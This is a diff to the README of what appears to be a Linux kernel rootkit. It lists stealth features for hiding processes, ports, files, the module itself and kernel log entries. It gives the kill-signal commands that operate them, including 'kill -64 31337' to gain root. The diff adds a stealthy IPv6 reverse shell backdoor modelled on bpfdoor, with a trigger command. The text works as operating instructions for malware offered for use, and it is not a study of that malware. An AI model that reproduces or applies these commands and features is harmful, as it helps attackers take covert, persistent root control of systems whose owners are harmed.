@@ -8,7 +8,8 @@
 <b>* Port Hiding:</b> Hide multiple ports using a kill signal. Unhide them one at a time or all at once.<br>
 <b>* Module Hiding:</b> Removes module from /proc/modules as well as /sys/module.<br>
 <b>* File/Directory Hiding:</b> Any file or directory starting with secret_ will be hidden.<br>
-<b>* Privilege Escalation:</b> The correct kill signal and magic number gives root privileges.<br><br>
+<b>* Privilege Escalation:</b> The correct kill signal and magic number gives root privileges.<br>
+<b>* Stealthy Reverse Shell Backdoor</b> IPv6 implementation of <a href="https://github.com/pjt3591oo/bpfdoor">bpfdoor</a> remote backdoor<br><br>
 
 ### Additional stealth features
 <b>* Filters Kernel Logs:</b> No tainted/out-of-tree/unsigned entries in dmesg or /dev/kmsg.<br>
@@ -20,6 +21,7 @@
 <b>* Hide Ports:</b> kill -61 [port] toggles visibility. kill -61 0 unhides all ports.<br>
 <b>* Hide Processes:</b> kill -62 [pid] toggles visibility. kill -62 0 unhides all processes<br>
 <b>* Gain Root:</b> Kill -64 31337. Magic number is configurable in source code.<br>
+<b>* Reverse Shell</b>./trigger [ remote addr ] [ local addr ]
 
 Module starts out hidden from both procfs and sysfs. It can't be uninstalled. You must reboot.<br><br>
 
